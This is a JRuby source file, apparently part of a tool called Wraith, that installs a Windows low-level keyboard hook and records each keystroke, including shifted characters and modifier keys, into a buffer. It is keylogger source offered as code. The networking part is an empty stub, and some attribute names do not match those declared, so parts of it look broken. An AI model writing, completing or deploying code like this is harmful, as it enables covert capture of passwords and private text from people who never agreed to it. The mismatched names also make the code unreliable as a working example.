ROOT = File.expand_path '../lib', __FILE__

require 'jruby'
require [ROOT, 'wraith'].join('/')
require 'socket'

class Wraith::Server
  attr_accessor :hook, :buffer
  attr :shift, :ctrl, :alt, :l_shift, :r_shift, :l_ctrl, :r_ctrl, :l_alt, :r_alt, :caps
  include Wraith
  def initialize
    user = com.sun.jna.platform.win32.User32::INSTANCE
    handle = com.sun.jna.platform.win32.Kernel32::INSTANCE.get_module_handle( nil )
    self.hook = Hook.new
    hook_handle = user.set_windows_hook_ex( 0x0D, self.hook, handle, 0x00 )
    self.hook.user = user
    self.hook.kl = self
    self.hook.hook_handle = hook_handle
  end

  def handle_key_down( key )
    case key
    when LEFT_SHIFT
      if !self.l_shift
        self.l_shift = true
        if !self.shift
          self.shift = true
        end
      end

    when RIGHT_SHIFT
      if !self.r_shift
        self.r_shift = true
        if !self.shift
          self.shift = true
        end
      end

    when LEFT_CONTROL
      if !self.l_control
        self.l_control = true
        if !self.control
          self.control = true
          log('[LCtrl]')
        end
      end

    when RIGHT_CONTROL
      if !self.r_control
        self.r_control = true
        if !self.control
          self.control = true
          log('[RCtrl]')
        end
      end

    when LEFT_ALT
      if !self.l_alt
        self.l_alt = true
        if !self.alt
          self.alt = true
          log('[LAlt]')
        end
      end

    when RIGHT_ALT
      if !self.r_alt
        self.r_alt = true
        if !self.alt
          self.alt = true
          log('[RAlt]')
        end
      end
    end
  end

  def handle_key_up( key )
    case key

    # Right shift
    when LEFT_SHIFT
      self.l_shift = false
      if !self.r_shift
        self.shift = false
      end

      # Left shift
    when RIGHT_SHIFT
      self.r_shift = false
      if !self.l_shift
        self.shift = false
      end

      # Left control
    when LEFT_CONTROL
      self.l_control = false
      if !self.r_control
        self.control = false
      end

      # Right control
    when RIGHT_CONTROL
      self.r_control = false
      if !self.l_control
        self.control = false
      end

      # Left alt
    when LEFT_ALT
      self.l_alt = false
      if !self.r_alt
        self.alt = false
      end

      # Right alt
    when RIGHT_ALT
      self.r_alt = false
      if !self.l_alt
        self.alt = false
      end

      # Caps lock
    when CAPS_LOCK
      self.caps = !self.caps
      log '[CapsLock]'

      # Windows button
    when WINDOWS
      log '[Win]'

    when BACK_TICK
      log check_case ? '~' : '`'

    when EQUALS
      log check_case ? '+' : '='

    when MINUS
      log check_case ? '_' : '-'

    when ZERO
      log check_case ? ')' : '0'

    when ONE
      log check_case ? '!' : '1'

    when TWO
      log check_case ? '@' : '2'

    when THREE
      log check_case ? '#' : '3'

    when FOUR
      log check_case ? '$' : '4'

    when FIVE
      log check_case ? '%' : '5'

    when SIX
      log check_case ? '^' : '6'

    when SEVEN
      log check_case ? '&' : '7'

    when EIGHT
      log check_case ? '*' : '8'

    when NINE
      log check_case ? '(' : '9'

    when A..Z
      log check_case ? key.chr : key.chr.downcase

    when SPACE
      log ' '

    when COMMA
      log check_case ? '<' : ','

    when DOT
      log check_case ? '>' : '.'

    when SLASH
      log check_case ? '?' : '/'

    when SEMICOLON
      log check_case ? ':' : ';'

    when APOSTROPHE
      log check_case ? '"' : "'"

    when LEFT_BRACKET
      log check_case ? '{' : '['

    when RIGHT_BRACKET
      log check_case ? '}' : ']'

    when BACK_SPACE
      if self.buffer.length > 0 && !self.buffer.nil?
        self.buffer.delete_char_at(self.buffer.length - 1)
      end

    when TAB
      log '[Tab]'

    when ENTER
      log "\n"

    when ESC
      log '[Esc]'

    when F1..F12
      log '[F' << (key-111).to_s << ']'

    else
      log "[Unknown key: #{key}]"

    end
  end

  def run

  end

  private

  def log( message )
    self.buffer = StringBuffer.new if self.buffer.nil?
    self.buffer << message
  end
end

server = Wraith::Server.new
server.run

if __FILE__ == $0
  server = Wraith::Server.new
  server.run
end
